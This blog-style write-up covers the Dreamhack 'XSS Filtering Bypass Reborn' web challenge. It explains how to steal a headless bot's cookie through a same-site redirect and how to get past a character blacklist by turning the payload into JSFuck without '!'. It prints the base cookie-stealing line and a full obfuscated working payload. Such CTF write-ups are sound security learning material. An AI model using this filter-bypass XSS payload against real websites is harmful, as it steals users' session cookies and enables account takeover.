---
title: "XSS Filtering Bypass Reborn"
date: 2025-10-21
summary: "dreamhack level 5 web chall"
tags: ["dreamhack", "ctf", "web", "xss"]
---

<img src="/blog/dreamhack_xss_filtering_bypass_reborn_writeup/images/chall.png" width=400>

We are given a webpage that has a `/vuln` endpoint with an XSS vulnerability, as well as a `/flag` endpoint that will visit the vulnerable endpoint with a headless browser.  

<img src="/blog/dreamhack_xss_filtering_bypass_reborn_writeup/images/source.png" width=500>

In the `/vuln` endpoint, our payload is already being put into an image that will auto trigger our payload, so our job is already being made slightly easier.  

<img src="/blog/dreamhack_xss_filtering_bypass_reborn_writeup/images/vuln.png" width=400>

The base payload would be to redirect the headless browser (with the flag cookie) to the `/memo` endpoint and log the flag.  

I encoded the `"?"` beforehand so that the transpiler wouldn't hardcode it later on.  

```js
location.href='/memo\x3Fmemo='+document.cookie
```

Looking at the source code, we can see that our payload is being checked against a character blacklist, and this severely restricts our options.  

<img src="/blog/dreamhack_xss_filtering_bypass_reborn_writeup/images/filter.png" width=500>

Thankfully, we can convert our payload to JSFuck to bypass most of the filter. I used https://js.retn0.kr/ in this case since the payloads generated are relatively shorter than other transpilers.  

<img src="/blog/dreamhack_xss_filtering_bypass_reborn_writeup/images/jsfuck.png" width=600>

However, we still notice that the obfuscated payload still contains `"!"`, which violates the blacklist.  

The exclamation marks are mostly used to type-cast `[]` to booleans, and a similar effect can be achieved without them.  

```js
(+[]==+[])    // !![] or true

([]==[])      // ![] or false
```

I wrote a Python script to rewrite the payload as such, and submitting the payload in the `/flag` endpoint will then display the flag.  

```js
가=((+[]==+[])+[])[+[]]+([]+{})[+(+[]==+[])]+(+[]+([]+[])[([]+{})[(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])]+([]+{})[+(+[]==+[])]+([][[]]+[])[+(+[]==+[])]+(([]==[])+[])[(+[]==+[])+(+[]==+[])+(+[]==+[])]+((+[]==+[])+[])[+[]]+((+[]==+[])+[])[+(+[]==+[])]+([][[]]+[])[+[]]+([]+{})[(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])]+((+[]==+[])+[])[+[]]+([]+{})[+(+[]==+[])]+((+[]==+[])+[])[+(+[]==+[])]]+[])[+(+[]==+[])+[+[]]]+((+[]==+[])+[])[+[]]+((+[]==+[])+[])[+(+[]==+[])]+([([]==[])]+[][[]])[+(+[]==+[])+[+[]]]+([][[]]+[])[+(+[]==+[])]+(([]+[])[([]+{})[(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])]+([]+{})[+(+[]==+[])]+([][[]]+[])[+(+[]==+[])]+(([]==[])+[])[(+[]==+[])+(+[]==+[])+(+[]==+[])]+((+[]==+[])+[])[+[]]+((+[]==+[])+[])[+(+[]==+[])]+([][[]]+[])[+[]]+([]+{})[(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])]+((+[]==+[])+[])[+[]]+([]+{})[+(+[]==+[])]+((+[]==+[])+[])[+(+[]==+[])]]+[])[+(+[]==+[])+[(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])]];나=([]+{})[(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])]+([]+{})[+(+[]==+[])]+([][[]]+[])[+(+[]==+[])]+(([]==[])+[])[(+[]==+[])+(+[]==+[])+(+[]==+[])]+((+[]==+[])+[])[+[]]+((+[]==+[])+[])[+(+[]==+[])]+([][[]]+[])[+[]]+([]+{})[(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])]+((+[]==+[])+[])[+[]]+([]+{})[+(+[]==+[])]+((+[]==+[])+[])[+(+[]==+[])];다=(([]==[])+[])[+[]]+(([]==[])+[])[(+[]==+[])+(+[]==+[])]+(([]==[])+[])[+(+[]==+[])]+((+[]==+[])+[])[+[]];あ=((+[]==+[])+[])[+[]];い=([][[]]+[])[+(+[]==+[])];う=((+[]==+[])+[])[(+[]==+[])+(+[]==+[])+(+[]==+[])];_=([]+{})[+(+[]==+[])];가가=(([]==[])+[])[(+[]==+[])+(+[]==+[])+(+[]==+[])];가나=([([]==[])]+[][[]])[+(+[]==+[])+[+[]]];가다=([][[]]+[])[+[]];가あ=(([]==[])+[])[+(+[]==+[])];가い=([]+{})[(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])];가う=((+[]==+[])+[])[+(+[]==+[])];[][다][나]((([]==[])+[])[(+[]==+[])+(+[]==+[])]+_+가い+가あ+あ+가나+_+い+'.'+(+(+(+[]==+[])+[((+[]==+[])+(+[]==+[])+(+[]==+[]))*((+[]==+[])+(+[]==+[]))+(+[]==+[])]))[가]((+[]==+[])+(+[]==+[])+[+[]])+가う+う+(([]==[])+[])[+[]]+'='+"'"+'/'+((+[])[나]+[])[+(+[]==+[])+[+(+[]==+[])]]+う+((+[])[나]+[])[+(+[]==+[])+[+(+[]==+[])]]+_+'\\'+(+(+(+[]==+[])+[+[]]+[+(+[]==+[])]))[ 가]((+[]==+[])+(+[]==+[])+(+[]==+[])+[(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])])[+(+[]==+[])]+(((+[]==+[])+(+[]==+[])+(+[]==+[]))+[])+[][다][나](가う+う+あ+가다+가う+い+' '+가다+い+う+가가+가い+가あ+(+((+[]==+[])+(+[]==+[])+[(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])]))[가]((+[]==+[])+(+[]==+[])+(+[]==+[])+[+[]])+う+'('+'"'+[][다][나](가う+う+あ+가다+가う+い+' '+う+가가+가い+가あ+(+((+[]==+[])+(+[]==+[])+[(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[])]))[가]((+[]==+[])+(+[]==+[])+(+[]==+[])+[+[]])+う+'('+'['+']'+'['+'"'+다+'"'+']'+')')()[(+[]==+[])+(+[]==+[])+(+[]==+[])+[+[]]]+(((+[]==+[])+(+[]==+[])+(+[]==+[])+(+[]==+[]))+[])+((((+[]==+[])+(+[]==+[])+(+[]==+[]))*((+[]==+[])+(+[]==+[])))+[])+'"'+')')()+((+[])[나]+[])[+(+[]==+[])+[+(+[]==+[])]]+う+((+[])[나]+[])[+(+[]==+[])+[+(+[]==+[])]]+_+'='+"'"+'+'+([][[]]+[])[(+[]==+[])+(+[]==+[])]+_+가い+가다+((+[])[나]+[])[+(+[]==+[])+[+(+[]==+[])]]+う+い+あ+'.'+가い+_+_+(+((+[]==+[])+(+[]==+[])+[+[]]))[가]((+[]==+[])+(+[]==+[])+[+(+[]==+[])])+가나+う)()
```

<img src="/blog/dreamhack_xss_filtering_bypass_reborn_writeup/images/flag.png" width=600>